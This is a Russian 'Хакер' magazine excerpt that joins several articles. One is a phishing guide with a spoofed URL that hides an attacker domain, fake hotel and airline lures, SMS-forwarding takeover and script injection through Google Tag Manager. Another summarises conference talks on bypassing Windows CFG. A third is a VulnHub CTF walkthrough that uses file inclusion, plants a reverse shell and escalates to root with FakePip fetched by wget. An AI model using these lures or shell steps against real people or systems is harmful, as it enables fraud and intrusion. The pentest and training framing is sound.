Не забудь прикрутить к серверу HTTPS, чтобы бра узер не ругал ся, но об этом
позже.


ПЕРЕПОЛНЕНИЕ ПРЕДПРОСМОТРА
Наверняка ты уже знаешь, что нас тоящее рас ширение файлов можно спря‐
тать, используя ограничение отображаемой длины стол бца extension в «Про‐
воднике» или архиваторе (или помнишь со времен ICO. :) — Прим. ред.).




            Попытка скрыть рас ширение файла в архи ве

Теперь давай попробуем сходным обра зом скрыть злую часть URL на этапе
предпросмотра в браузере.
   Если сотрудник знает, что анкор ссылки может быть не равен целевому
URL, то он наведет мышкой на ссылку и посмотрит, куда на самом деле она
ведет. Если это его единственный спо соб про верки ссылок, то инструкции
по безопасности в такой компании пора обновлять.
   Злая ссылка может быть, к примеру, такой:


https://berbank.ru:
ааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааа
ааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааа
а@zloysait.
ru/bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
bbbbbbbbbbbb.html

Вместо aaaa и bbbb пишем раз ные ключевые сло ва, которые обычно исполь‐
зуются на оригинальном сайте.
  При наведении мышкой в Firefox увидим сокращенный посередине адрес
сайта,  из‐за  чего  часть zloysait.ru не отоб ражается. Видна  только
не вызывающая подозрений часть ссылки:


https://berbank.ru:
ааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааааа
ааааааааааааааааааааа..
.bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.html





                    Сокращен ный URL в Firefox

Для больших экранов фишинговую ссылку лучше сделать подлиннее. Если
навести мышку на такую ссылку в Internet Explorer или Edge, то мы не увидим
вообще ничего. Судя по всему, их смущает повторное двоеточие в адре се,
что нас вполне устраивает.
   Chromium‐браузеры от Google и Яндекса отображают конечный URL zloy‐
sait.ru/bbbbbbbb...bbbbbbbb.html, поэто му данный способ подойдет
для таргетированной ата ки, когда известен браузер жертвы.


«ПОЧТА РОССИИ» ТЕБЕ В ПОМОЩЬ!
Если жертва занимает руководящую дол жность в целевой компании, можно
попробовать сыграть на ее чувс тве собственной важ ности.
  Создается фейковый одностраничник конференции (бизнес‐мероприятия,
бизнес‐форума и подобного). Теперь жертву нуж но заманить на ресурс.
Почему бы не отправить бумажное письмо ей на работу? Тут ты точно обой‐
дешь всю цифровую и железную защиту в орга низации и даже нейросете вой
файрвол в виде секретарши, так как, по ее мнению, если она выкинет такое
письмо в корзину, ее начальник не обрадуется. Очень уж привлекательно выг‐
лядит содержимое — кра сивое приглашение поучаствовать в пафосном
мероприятии в качестве спикера (члена жюри, лауреата престижной премии).
   Дальше все стандартно: предлагается скачать и запол нить «анкету» учас‐
тника. Можно даже QR‐код напечатать (вроде как заботимся о вашем удобс‐
тве, глубокоуважаемая жертва).


ЛИЧНОЕ ИЛИ ПУБЛИЧНОЕ?
Следующие несколько способов отно сят ся к атакам на организацию через
использование фактов о личной жизни сотрудни ка. Рассказывая о защите
от социальной инженерии, я настаиваю на том, что человек должен знать пра‐
вила безопасности не ради организа ции, а в первую оче редь для себя. Пока
в некоторых СБ думают, что принесенный на работу смартфон с пойманным
на выходных трояном нельзя использовать для прослушки внутриофисных
событий, мы будем находить таких сотрудников и делать их более компетен‐
тными.


Не чекином единым
Если ты тестируешь личный email сотрудника или его аккаунт в соцсетях, то
посмотри, где человек отдыхал в пос леднее время.
  Видишь название отеля? Смело пиши от имени администрации отеля
и требуй доплаты за сервис. В письмо добавь надпись, что данное сооб‐
щение сгенерировано автоматически, а для ответа нужно воспользоваться
формой на официальном сайте в разделе поддержки клиентов. Дав фей‐
ковую ссылку, предложи ему зарегистрировать ся. Кто знает, быть может, этот
логин/email и пароль он использует и на дру гих ресурсах.





               Хотел похвастать ся и навлек неприятности

Потенциальная жертва лета ет самолетами «Аэрофлота»? Напиши, что срочно
надо активировать бонусные мили, и тогда их количес тво удвоится! Сделать
это нужно по твоей фей ковой ссылке с лен дингом акции.





                Авиабилет — находка для социн женера

Жертва недавно посетила какое‐то мероприятие? Попроси ее зарегис три‐
роваться по твоей ссылке, что бы получить все записи с конференции +
бонусный контент и скидку на учас тие в следующей!





             Пост в соцсети, облегчающий жизнь пентестеру

Чтобы жертва ничего не заподозрила, после того как зарегистрировалась, ей
можно показать сооб щение об ошибке (например, «404. Ой, что‐то пошло
не так, попробуйте повторить ваш запрос поз же!») или отправить на главную
страницу сайта.
  Примерно в таком ключе мож но обращаться к челове ку на основании све‐
жих данных из его аккаунтов в соцсетях. Здесь мы использовали по большей
части фишинговые методы, и нам этого достаточно, чтобы проверить бди‐
тельность сотрудника. Нас тоящие зло деи, конечно, на этом не остановятся
и  будут  использовать  уяз вимости  бра узеров  и  вредонос ные  файлы
для заражения устрой ства жертвы. Это уже техничес кая часть, а не социаль‐
ная.


SMS-редирект
Наверняка ты уже слышал исто рию о том, что у Bitcoin‐инвестора с под‐
ходящей фамилией Терпин украли 23 миллиона долларов при помощи
банального запроса о перено се номера мобиль ного на новую SIM‐карту.
А что, если немного пофантазировать и пос мотреть, как с помощью фишинга
получить доступ к интернет‐сервисам сот рудника, защищенным двухфактор‐
ной аутентификацией? Вдруг кто‐то из сотовых операторов дает воз можность
получить симку, не воруя номер?
   Сотруднику на личный телефон (или корпоративный мобильный) отправ‐
ляется SMS или email с призывом сделать что‐то в его личном кабине те.
Повод лучше выбрать страшный (из‐за чего прямо сей час нужно туда зайти)
или надавить на жадность, чтобы не побуждать человека звонить в тех‐
поддержку. Нужно только знать, к какому операто ру относится его номер,
и дать подходящую фишин говую ссылку. Пос ле получе ния дос тупа в кабинет
человек со злым умыслом ста вит свой телефон для приема SMS в раз деле
«Переадре сация сооб щений».
   У большинства операто ров предоставляется на выбор множес тво сце‐
нариев по настройке редиректов.





            Описание услуги на сайте сотового оператора


Один email — один банк
Если ты нашел на сайте какого‐то круп ного банка такую строчку:


src='//www.googletagmanager.com/gtm.js?id='

то представь следующий сценарий:
 1. С помощью социальной инженерии и фишинга получаешь доступ к акка‐
   унту @gmail.com маркетоло га.
 2. Через сервис Google Tag Manager вставляешь по этой ссылке любой JS‐
   скрипт (например, новогоднее поз дравление) и жмешь «Сохранить».
 3. Теперь твой скрипт будет поз дравлять посети телей с наступающим Новым
   годом (если служба безопас ности будет не против и не перестанет поль‐
   зоваться иностранными сервисами).


             INFO

                       Google Tag Manager — сервис, который упрощает
                       размещение на сайте информации, в том числе
                       JS‐скриптов. Соответс твен но, если ты имеешь
                      доступ к аккаунту, с которого делаются настройки
                        Tag Manager, ты можешь внедрить свой вре‐
                      доносный код на сайт.





              Место для вставки вредоносного кода


Маркетоло гам на заметку
Кстати, вот один из спо собов сфишить email маркетолога, отвечающего
за сайт. Если организация дает рекламу в AdWords, то воз можен такой сце‐
нарий. Здесь: https://ads.google.com/aw/preferences — пишем наз‐
вание фейкового аккаунта. Что‐то наподобие:


. . . . . . . . . . . . . . . . . . . . Для получения расширенной
статистики по аккаунту такому‐то подтвердите свое участие в
Beta‐тестировании: www.bad‐ad‐google.com





                      Ука зываем название аккаунта

Идем сюда: https://ads.google.com/aw/accountaccess/users — и пишем
email получателя.





                  Выбираем уровень дос тупа

Пользователю придет письмо от имени ads‐noreply@google.com.





            Пример сооб щения от ads‐noreply@google.com

Дальше следует фишинговая форма авториза ции, загрузка экс плоита и тому
подобное.
  В Google сказали: хоть социальная инженерия и зло, мы не уберем воз‐
можность отправки таких сообщений. Просто подкрутим, чтобы через эту
форму было сложнее отправлять спам. Социальному инже неру этого дос‐
таточно, он ведь не спамер.
   Если с маркетологом не задалось, загляни в прошлую статью. В ней мы
упоминали, как атаковать веб‐мас тера, исполь зующе го Google  Analytics.
Правда, после моего сообщения в Google они прикрутили капчу, но исполь‐
зовать сервис в корыстных целях все еще можно.


Бо нус
Напоследок приведу несколько лайфха ков.
 • Если писать жертве, представляясь таким же именем, как у нее, то отклика
   будет больше.
 • Отправляешь письмо на любую корпоративную почту компании, получа‐
  ешь ответ и видишь, как оформляется корреспонденция в этой организа‐
   ции. Затем копируешь оформление в сво ей фишинговой рассылке от име‐
   ни этой компании.
 • Услышав сообщение авто ответчика о том, что сотрудник в отпуске, от его
  имени можно писать письма другим сот рудникам (якобы с личного,
   не корпоративного email), а также делать пос ты в соцсетях с его «дру гого
   аккаунта».
 • Многие пользователи считают, что если они попали на ресурс с «замоч‐
   ком» в адресной строке, то ресурсу можно доверять. Let’s Encrypt поможет
   социальному инженеру, раз уж это увеличивает конверсию.
 • Нет ничего хуже после отправки email, чем ответ почтового демона:
  «Сообщение  не  доставлено,  адрес  не  существует. ПОДРОБНЕЕ
  ОБ ОШИБКЕ (и тут ссылка на твой сайт и демоничес кий хохот за кадром)».
 • Тренд будущего в СИ —  Find  trap, спо соб,  когда челове ку дается
  информационная наживка, и он сам ищет подробности в поисковиках.
   Находит твой ресурс (поскольку наживка сос тавлена именно так, чтобы
   выводить на него), а дальше — толь ко полет фантазии ограничивает твои
   возможности. Нет ничего лучше заин тересованного пользователя. К сло‐
   ву, именно таким способом мы отлавливаем в организациях продажных
   сотрудников.


ВМЕСТО ВЫВОДОВ
О технических средствах защиты от социальной инженерии ты наверняка зна‐
ешь лучше меня. К сожалению, их недостаточно. Как говорил основатель
Group‐IB Илья Сачков: «…какие бы ни были технологии… все становится бес‐
смысленно, если сотрудники открывают подоз рительные файлы и кликают
на фишинговые ссылки… и у всех вез де одинаковые пароли». Поэтому в сле‐
дующий раз мы поговорим о том, как обучать сотрудников не попадаться
на уловки социальных инженеров.


        WWW

                           •Positive Technologies об опасностях социальной
                       инженерии
                   •В помощь СБ: PHaaS — фишинг как сервис
                          за рубежом
                     •Российский аналог PHaaS
                     •Ликбез о применении социальной инженерии
                           от пен тесте ров до правительств
ВЗЛОМ

ЭКСПЛОИТЫ
 В ДЕСЯТКУ





 ОБЗОР САМЫХ ИНТЕРЕСНЫХ ДОКЛАДОВ
    С МИРОВЫХ ИБ‐КОНФЕРЕНЦИЙ




В последние годы мы отучились воспри‐
нимать  Windows  как  нечто  неверо ятно
дырявое. Эта операционка определен но
стала более стойкой к хакерским ата кам,           Антон Карев
                                                                                    Эксперт по информационной
                                                                                       безопасности. Образованиеи основной поток ненависти пользователей
                                                                                   высшее, специальность
                                                                                  «Защита информации вона теперь собирает с помощью своих                                                                                компьютерных системах», в
                                                                                 настоящий момент работаетглючных  апдейтов. Впрочем,  последние                                                                                   над диссертацией. Область
доклады с ИБ‐конференций показывают,          профессиональных                                                                                    интересов — технологическая
что и с безопас ностью у нее все далеко       разведка,ИБ, искусственныйаналитика в сфере
не идеально.                                                                     vedacoder@mail.ruинтеллект.


ОБХОДИМ ВСЮ СОВРЕМЕННУЮ КИБЕРЗАЩИТУ
МАЙКРОСОФТОВСКОГО EDGE
Henry Li, Jack Tang. Cross the Wall — Bypass All Modern Mi10tiga-
tions of Microsoft Edge // Black Hat. 2017
  В Windows 10 по умол чанию активированы такие защитные механизмы,
как ASLR (Address Space Layout Randomization — рандомизация распределе‐
ния адресного пространс тва), DEP (Data Execution Prevention — предотвра‐
щение выполнения кода, раз мещенного в сегменте данных) и CFG (Control
Flow Guard — охрана потока управления). Благодаря им киберзлодею зна‐
чительно сложнее манипулировать памятью операционной системы. Самый
перспективный из этих защитных механизмов — CFG. Если атакуемое при‐
ложение защищено механизмом CFG, то руки взломщика остаются связан‐
ными, даже если у него есть про извольный доступ (на запись и на чтение)
ко всему адресному пространс тву оперативной памяти.


Что такое CFG
CFG представляет собой механизм безопас ности, приз ванный пре дотвра‐
щать ситуации, когда «косвенные перехо ды» (кос венные call/jmp) перенап‐
равляют поток управления в неожиданные места адресного пространства.
Впервые появив шийся в Windows 8.1, CFG на данный момент реализован
в Windows 10 в качестве рас ширенной функции безопасности.
   Суть работы CFG в следующем: во время компиляции перед каждым кри‐
тичным «косвенным переходом» вставляется специальная функция, контро‐
лирующая коррек тность потока управления. Затем эта специальная функция
проверяет, уже в рантайме, целевые адреса перехо да при помощи заранее
предопределенной CFG‐карты (CFG bitmap).


Однако хакеры не сидят на месте и постоянно придумы вают все новые
и новые трю ки для обхода непрерывно совершенс твующихся механиз мов
киберзащиты. В этой презентации докладчик (инженер из Trend Micro) делит‐
ся некоторыми из разработанных им трю ков. В том числе:
 1. Трюк, при помощи которо го можно обойти CFG и DEP и обес печить себе
   возможность произвольного выполнения кода. На примере браузера Edge
   этот трюк эксплуатирует темную сторону системного механиз ма «прок‐
   ладок» и не требует применения тра диционной техники ROP.
 2. Трюк, при помощи которого можно обойти ASLR. Эксплу атируя логические
   недоработки в механиз ме «сборщика мусора», который используется
   в  языках  программирования  для  управления  памятью  при  работе
   с динамическими переменными (в час тности, в таких популярных JS‐движ‐
   ках, как jscript9 и chakra), зло дей может обойти ASLR без необходимости
   эксплуатировать какую‐либо уязвимость.





Что такое shims («прок ладки»)
Shims представляют собой небольшие фрагменты кода, которые перех‐
ватывают API‐вызовы приложений — для их согласования между раз личны ми
версиями ОС. Иначе говоря, прокладки предназначены для «исправления
совместимости»: чтобы приложения, разработанные для более ранних вер‐
сий ОС и ее API, могли корректно выполнять ся и в текущей версии ОС.
«Прокладка» может либо какую‐то воз можность отклю чать в текущей версии
ОС, либо эмулиро вать определенное поведение ста рой версии API.



НОВЫЙ ТРЕНД В РАЗРАБОТКЕ ЭКСПЛОИТОВ: АТАКИ,
ОРИЕНТИРОВАННЫЕ НА ДАННЫЕ
Bing Sun, Chong Xu, Stanley Zhu. The Power of Data-Oriented At-
tacks: Bypassing Memory Mitigation Using Data-Only Exploitation
Technique // Black Hat. 2017
  Поскольку практичес ки все разработчики при ложений стали повально
делать акцент на контроле целостнос ти потока управления (в час тности,
пользоваться майкрософтовским механизмом CFG), традици онные методы
эксплуатации уязвимостей (нап равленные на захват контрольного потока)
стали трудноосуществимы. Как теперь жить хакерам? Неужели им при дется
повесить на крюк свои черные шляпы и отпра виться на моря проживать свои
неправедно нажитые капиталы?
  Оказывается — нет, о хакерской пенсии речь пока не идет. Взломщики
начали искать способ эксплуатировать уяз вимости, не затрагивая потока
управления... и нашли его. Они придума ли ата ку, ориентированную на данные
(DOA, data‐oriented attack), принципиальное отличие которой в том, что она
направле на на фальсификацию в приложении критических данных, а не на то,
чтобы изменить поток управления.
   DOA‐атаки позволяют злодею в числе про чего подключать к приложению
нежелательные или отключенные модули (и затем эксплуатировать уязвимос‐
ти, содержащиеся в коде этих модулей) и изменять атри буты у некоторых
страниц оперативной памяти. Первый вариант для киберзлодеев в особен‐
ности интересен, потому что современные приложения, как правило, тянут
за собой прицепом большие кус ки невос требованного бинарного кода,
который вроде бы к программе отношения не имеет, но волочится за ней
мертвым грузом. Порой для DOA‐атаки дос таточно изменить лишь несколько
битов данных. В док ладе продемонстрировано на примере браузера Edge
(Windows 10), как при помощи DOA‐атаки можно обходить защитные механиз‐
мы CFG/DEP.


WINDOWS ОТДУВАЕТСЯ ЗА УЯЗВИМОСТИ LINUX: УВЕЛИЧИВАЕМ
ПРИВИЛЕГИИ ЧЕРЕЗ WSL
Saar Amar. Linux Vulnerabilities, Windows Exploits: Escalating Privi-
leges with WSL // BlueHat. 2018
  WSL (Windows Subsystem for Linux) — довольно‐таки изящ ный механизм,
недавно интегрированный в ядро Windows 10. Эта подсисте ма позволя ет
запускать под Windows исполня емые файлы Linux без какой‐либо их пред‐
варительной адаптации. WSL позволяет бинарникам Linux использовать свои
родные системные вызовы и привычный макет файловой сис темы. Как и
любое другое большое (по объему бинарного кода) новшес тво, WSL пред‐
ставляет собой непаханое поле для охотников за уяз вимостями. Массивный
.sys‐файл, реализующий WSL‐подсистему, как будто бы сам просится, чтобы
его отреверсили.
  Докладчик делится своими находками, которые сделал при реверсинге
WSL‐подсистемы. При этом он вос торга ется, как виртуозно раз работчики Mi‐
crosoft жонглируют внутреннос тями двух совершенно разных опе рационных
систем. Докладчик демонстрирует исполня емый файл Linux, который может
делать системные вызовы в Windows и переза писы вать память в ядре Win‐
dows. Со всеми вытекающими, приятными для лесоруба (извини, прос то мы
тут подсели на старые книги по хакерству и подцепили там прямой перевод
слова hacker. :) — Прим. ред.) последс твиями.
  Докладчик щедро делится трюками, которые поз воляют, во‐первых,
реализовать WSL‐эксплоит без летального исхо да для операционной сис‐
темы и, во‐вторых, добиться возможности выполнения произвольного кода
в современном ядре Windows 10.


BIG DATA НА СЛУЖБЕ ВЫЯВЛЕНИЯ НЕ ОХРАНЯЕМЫХ CFG-
ПОДСИСТЕМОЙ «ВОРОТ»
Never Let Your Guard Down: Finding Unguarded Gates to Bypass
Control Flow Guard with Big Data // Black Hat. 2017
  В недале ком прошлом уже были представлены нес колько эффектных док‐
ладов с описанием приемов для обхода CFG. Среди таких докладов: «Обход
CFG: системный подход», где обсужда лись раз личные поверхности атаки
и универсальный прием для обхода CFG‐защиты — доступ к указателю
на функцию CF_check_function переключается с «только на чтение» на «чте‐
ние и запись», исполь зуя для это го логичес кий недочет, найденный в дес трук‐
торе CustomHeap::Heap (из класса Jscript9); «Обход CFG на Windows 8.1 Up‐
date 3», где объяснялось, как искать неохраняемые «косвенные переходы»
в JIT‐бинарниках, которые генерирует встро енный компилятор Adobe Flash
Player.
   Упомянув иссле дования своих предшественников и засвидетельствовав
им свое почтение, док ладчик затем сооб щает, что, хотя «Майкрософт» уже
выпустила несколько обновлений для CFG, где устранена значительная часть
обнаруженных уязвимостей, группе исследователей удалось най ти в CFG
множество недочетов, которые поз воляют обходить CFG‐защиту даже тогда,
когда в Windows 10 все самые свежие обновления установлены.
  Все эти уязвимости обнаружены при помощи разработанной исследова‐
телями утилиты. Эта утилита опирается на функциональность PMU‐модуля
(Performance Monitor Unit — устройство контроля характерис тик аппарату ры),
чтобы собирать контекстную информа цию всех косвенных вызовов, которые
происходят в рантайме (активируя при каждом косвенном вызове специально
подготовленное прерыва ние, которое журналирует все косвенные вызовы).
Затем эти собранные данные ана лизируются пос редством Big Data подхода
на основе Spark. В докладе демонс трируются трю ки и ути литы для поиска
уязвимостей, позволя ющие обходить CFG, на примере нескольких популяр‐
ных приложений для Windows (в том числе IE11, Adobe Flash Player и Microsoft
Edge).





16 БАЙТ, КОТОРЫЕ ПОЗВОЛИЛИ ОБОЙТИ CFG-ЗАЩИТУ
Andrea Biondo, Mauro Conti, Daniele Lain. Back To The Epilogue:
How to Evade Windows' Control Flow Guard with Less than 16 Bytes
// Black Hat. 2018
  CFG в настоящее время используется во всех опе рационных системах
семейства Windows, начиная с 8.1 и заканчивая последним обновлением Win‐
dows 10. В докладе описывается ата ка, которая полностью нейтрализует
CFG‐защиту и позволя ет переда вать управление на любой адрес памяти,
возвращая крэкеру (опс, опять сло вечко из классичес ких книг прилипло. :) —
Прим. ред.) возможность выполнять про извольный код.
   Эта атака стала возможной благода ря тому, что при реализации CFG его
разработчики придерживались компромисса между точностью, произво‐
дительностью и обратной совместимостью. В час тности, из‐за стремления
к обратной сов местимости в CFG память адресуется 16‐байтовыми блоками.
Благодаря этому в бинарном коде исполняемых фай лов довольно часто появ‐
ляются гаджеты, которые позволяют избежать CFG‐контроля.
  В докладе приведены результаты независимого исследования сис темных
библиотек Windows, которое группа экспертов провела, чтобы выяс нить, есть
ли в них такие гаджеты. Обнаружилось, что CFG‐гаджеты в числе прочего
присутствуют в самых востребованных системных библиотеках Windows,
которые подгружаются практически всеми приложениями 32‐битной под‐
системы и некото рыми особо привлекатель ными для злодея приложе‐
ниями 64‐битной подсистемы (такими как Edge и Internet Explorer). Каждое
приложение, которое подгру жает из системной библиотеки бинарный код
с гаджетом, может стол кнуть ся с тем, что CFG‐контроль не сработает.
  В докладе описан алгоритм действий, бла годаря которому удалось
выявить эту уязвимость в дизайне CFG, и приведены технические подробнос‐
ти осуществления атаки. Демонс трируется ее практичность через примене‐
ние RCE‐эксплоита, нацелен ного на Edge, который работает на 64‐раз‐
рядной версии ОС Windows 10.





РЕВЕРСИМ ДВИЖОК WINDOWS DEFENDER
Alexei Bulazel. Reverse Engineering Windows Defender’s JavaScript
Engine // Recon. 2018
   DLL’ка,  в  которой  хранит ся  ядро  Defender’а  (MpEngine.dll),  весит
целых 11 мегабайт. В ней насчитыва ется боль ше 45 тысяч функций. В этой
презентации докладчик приводит результаты анализа 1200 из них — тех, что
реализуют функциональ ность проп риетарного JS‐движка, которым Defender
пользуется для анализа потенциально вредоносного JS‐кода. Этот JS‐движок
еще очень‐очень молод и, соответственно, куда менее зрел, чем те, которые
можно найти в браузерах. Так что Defender’овский JS‐движок — весьма прив‐
лекательная мишень для реверсеров.
  Докладчик делится своим опытом реверсинга этого движка и приводит
технические подробности его работы: какие типы данных в нем используются,
как организовано управление памятью, воз можнос ти JS/ECMAScript, каким
образом этот движок интегрируется с антивирус ной системой Defender’а.
Кроме того, докладчик объясняет, как раз рабатывать свои собственные ути‐
литы, взаимодействующие с Defender’ом, раскрывает обнаруженные в JS‐
рантайме баги и делится трюками противо действия анализу, которы ми мож‐
но пользоваться при создании вредоносных JS‐скриптов.
ВЗЛОМ



       ЛОМАЕМ ВИРТУАЛЬНУЮ МАШИНУ
                      С VULNHUB





                                                                         Андрей Скуратов





                                                                            Сергей Мигалин





                                                                      Михаил Фирстов

        ЗАХВАТ
     ВАКАНДЫ



Сегодня  мы  займемся  взло мом  виртуальных  машин
с VulnHub — ресурса, предоставляющего образы опе раци‐
онных систем с сервисами, в которых «зашиты» уязвимости.
Он создавался, чтобы каждый мог получить прак тический
опыт в области цифровой безопасности и сетевого адми‐
нистрирования. Нужно всего лишь ска чать образ виртуалки,
правильно настроить сеть и запустить.


ПОДГОТОВКА ВИРТУАЛЬНОЙ МАШИНЫ
Для начала скачаем необходимый софт и сам образ виртуалки. Запускать
будем в VirtualBox. Теперь выберем одну из новых виртуальных машин, нап‐
ример Wakanda: 1.
  После того как скачали образ и установили VirtualBox, время настраивать
сеть. Открываем менеджер сетей хос та и соз даем новый адаптер.





Импортируем виртуалку в VirtualBox и идем в ее нас тройки. Нам нужна вклад‐
ка «Сеть». Устанавливаем тип подключения как «Виртуальный адаптер хос та»
и указываем недавно соз данный виртуальный адап тер. Обращаем внимание
на созданный MAC‐адрес, так как он нам еще понадобится, чтобы найти его
в сети.





Теперь можно запускать. Сделаем это!





ПОИСК МАШИНЫ
После того как мы экспортирова ли и запус тили виртуал ку, нам нужно узнать,
какой у нее IP‐адрес. Для этого на хос те вос пользуемся командой $ arp‐
scan ‐l на Kali Linux, которая находится в одной сети с Wakanda.





СКАНИРОВАНИЕ ПОРТОВ
Как обычно, начнем исследование машины со скана портов. Для этого вос‐
пользуемся утилитой Nmap:


$ nmap ‐p‐ ‐sV 192.168.93.128





Видим, что запущен Apache на 80‐м порте, SSH на 3333‐м и какой‐то мусор
на 111‐м и 56737‐м портах.


САЙТ НА PHP
Начнем с сервиса на 80‐м порте. Там висит ничем в целом не примечатель‐
ный сайт без каких‐то особенных функций.





Прежде чем фаззить директории, залезем в исходный код страницы. Видим
закомментированную ссылку, веро ятно на француз скую версию сайта.





Попробуем зайти. И правда, сайт теперь на француз ском языке.





Откроем Burp и попробу ем про фаз зить параметр lang.





И с первого же раза получаем исходный код стра ницы index.php с помощью
уязвимости  Local  File  Inclusion  и  фильтра  Base64  PHP.  Рас кодируем
с помощью команды $ base64 ‐D или через он лайн‐тул зу и увидим в самом
начале какой‐то пароль. Интерес но, от чего же он?





ПОЛУЧАЕМ ДОСТУП ПО SSH
Вспоминаем, что на 3333‐м порте в машине запущен SSH. Возможно, пароль
подойдет к нему. Но какой логин? Пройдемся еще раз по исходникам сайта
и увидим, что сайт создал некий mamadou. Пробуем подключиться, используя
полученный пароль: $ ssh ‐lmamadou 192.168.93.128 ‐p 3333.





ПЕРВЫЙ ФЛАГ
Зашли, видим запущенный Python 2. Теперь войдем в Bash с помощью
команды


import os; os.system("/bin/bash")

Итак, мы в системе. Посмотрим, что в домаш ней папке ($ ls), видим файл
flag1.txt, выведем его содержимое с помощью $ cat flag1.txt.





В ПОИСКАХ ВТОРОГО ФЛАГА
Для начала узнаем, где находится файл flag2.txt. Для этого выпол ним $
locate flag2.txt. Как оказалось, второй флаг ждет нас в /home/devops/
flag2.txt, но у нас нет прав, чтобы его прочитать, а владелец — поль‐
зователь devops из группы developer.





Поищем еще файлы, которые ему при надлежат. Для этого посмотрим
на результат команды $ find / ‐user devops.





Видим, что есть скрытый файл /srv/.antivirus.py с весьма прозаичным
содержанием.




Судя по тому, что файл /tmp/test сущес твует, этот скрипт выполняется
при  загрузке от поль зователя devops. Поэтому добавим туда простой
реверс‐шелл и перезагрузим виртуалку.





Теперь подключимся через $ nc 192.168.93.128 4444 и пос мотрим список
файлов: $ ls /home/devops. Файл со вто рым флагом на мес те! :) Выводим
его $ cat flag2.txt.





ПОСЛЕДНИЙ РУБЕЖ: ПОЛУЧАЕМ ROOT(.TXT)
Поискав публичные эксплоиты для эскалации привилегий на этой версии
ядра, мы ничего не нашли. Придется делать ручками. Для начала сделаем
полученную сессию «нор мальной» по этой инструкции.
  Посмотрим с помощью sudo ‐l, кто в системе может запускать прог‐
раммы от имени администратора.





Как видим, /usr/bin/pip работает с sudo без пароля, а значит, осталось
сделать совсем немного.
   Гуглим «pip privileges escalation» и прямо на первой статье видим ссылку
на FakePip. Делаем все по инс трукции:


$ cd /tmp && wget https://raw.githubusercontent.com/0x00‐0x00/
FakePip/master/setup.py

Меняем переменную RHOST на наш айпишник.





Запускаем у себя nc ‐lvvp 443, а на виртуалке $ sudo pip install . ‐‐
upgrade ‐‐force‐reinstall.





Теперь у нас есть права администра тора, и остается одна команда…


$ locate root.txt | xargs cat





Done!


ЧТО МЫ СЕЙЧАС СДЕЛАЛИ?
Мы просканировали порты на вир туальной машине; выяснили, что на 80‐м
порте запущен Apache с веб‐приложением на PHP, а на 3333‐м — SSH. Наш‐
ли в PHP уязвимость Local File Inclusion и проэксплу атировали ее, получив
исходный код страницы, в котором переменной $password был присвоен
пароль от SSH поль зователя mamadou.
  Первый флаг был в домаш ней папке пользователя. Изменив скры тый файл
/srv/.antivirus.py, который принадлежит пользователю devops и исполня‐
ется от его имени при загрузке системы, мы получили возможность работать
от его имени и нашли вто рой флаг в /home/devops/flag2.txt. Узнав, что PIP
может устанавливать пакеты от имени админис тра тора без пароля sudo, мы
повысили привилегии до root с помощью пуб лично го эксплоита и нашли тре‐
тий флаг в /root/root.txt.
  На этом мы закончим с «Wakanda: 1». Дру гие наши рай тапы можешь найти
в блоге blog.fbkcs.ru.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.





ПРОВЕРКА
                                                            Юрий Язев
                                                                            Программист, разработчикАУТЕНТИЧНОСТИ                                                                         компьютерных игр. Старый
                                                                                 автор журнала «Хакер»
                                                                                    yazevsoft@gmail.comИ БАЗОВЫЙ ВЗЛОМ
ЗАЩИТЫ




Пятнадцать лет назад эпический труд Криса Касперски
«Фундаментальные основы хакерства» был настольной кни‐
гой каждого начинающего исследователя в области компь‐
ютерной безопас ности. Однако время идет, и знания, опуб‐
ликованные  Крисом,  теряют  актуальность.  Редакторы
«Хакера»  попытались  обно вить  этот  объемный  труд
и перенести его из времен Windows 2000 и Visual Studio
6.0 во времена Windows 10 и Visual Studio 2017.


ПРОВЕРКА АУТЕНТИЧНОСТИ
Проверка аутентичности (от греч. authentikos — подлинный) — «сердце»
подавляющего большинства защитных механизмов. Должны же мы удос‐
товериться, то ли лицо, за которое оно себя выдает, работает с программой
и разрешено ли это му лицу работать с программой вообще!
  В качестве «лица» может выступать не только пользователь, но и его
компьютер или носитель информации, хра нящий лицензионную копию прог‐
раммы. Таким образом, все защит ные механизмы можно разделить на две
основные категории:
 • защиты, основанные на знании (пароля, серийного номера);
 • защиты, основанные на обладании (ключевым диском, документаци ей).





                    Ос новные типы защит

Если защита базируется на одном лишь предположении, что ее код не будет
изучен и/или изменен, — это пло хая защита. Отсутствие исходных текстов
отнюдь не служит непреодолимым препятстви ем для изучения и модифи‐
кации приложения. Современные технологии обратного проектирования поз‐
воляют  автоматически распозна вать биб лиотечные функции,  локальные
переменные, стековые аргу менты, типы данных, ветвления, циклы и прочее.
А в недалеком будущем дизас семблеры, веро ятно, вообще научатся генери‐
ровать листинги, близкие по внешнему виду к языкам высокого уровня.
  Но даже сегодня анализ двоично го кода не настолько тру доемок, чтобы
надолго остановить злоумыш ленников. Огромное количес тво постоянно
совершаемых взло мов — лучшее тому подтверждение. В иде альном случае
знание алгоритма работы защиты не должно влиять на ее стойкость, но это
достижимо далеко не всегда. Например, если раз работчик серверной прог‐
раммы  решит  установить  в  демонстрационной  версии  ограничение
на количество одновременно обрабатываемых соединений (как часто и слу‐
чается), злоумышленнику достаточно найти инструкцию процессора, выпол‐
няющую такую проверку, и удалить ее. Модификации программы можно вос‐
препятствовать постоянной проверкой ее целостности, но опять‐таки код,
проверяющий целостность, может быть найден и уда лен.





ШАГ ПЕРВЫЙ. РАЗМИНОЧНЫЙ
Алгоритм простейшего механизма аутентификации состоит в посимвольном
сравнении введенного пользователем пароля с эта лонным значением, хра‐
нящимся либо в самой программе (как час то и бывает), либо вне ее, нап‐
ример в конфигурационном файле или реестре (что встречается реже).
  Достоинство такой защиты — край не прос тая программная реализация.
Ее ядро состоит фактически из одной строки, которую на языке С можно
записать так:


if (strcmp(введенный пароль, эталонный пароль)) {/* Пароль неверен */
